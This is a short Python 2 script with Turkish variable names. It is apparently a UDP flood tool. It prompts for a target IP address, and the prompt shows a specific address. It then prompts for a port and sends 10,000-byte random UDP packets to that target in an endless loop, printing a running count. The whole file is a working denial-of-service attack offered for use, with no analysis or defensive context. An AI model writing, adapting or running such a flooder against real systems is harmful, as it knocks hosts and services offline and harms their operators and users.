import socket
import random
import os

os.system("clear")

hedef_ip=raw_input("( 54.38.220.25 ): ")
hedef_port=input("Two: ")

bytes=random._urandom(10000)
sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)

sayac=0
while True:
	sock.sendto(bytes,(hedef_ip,hedef_port))
	sayac=sayac+1
	print("Started:%s"%(sayac))
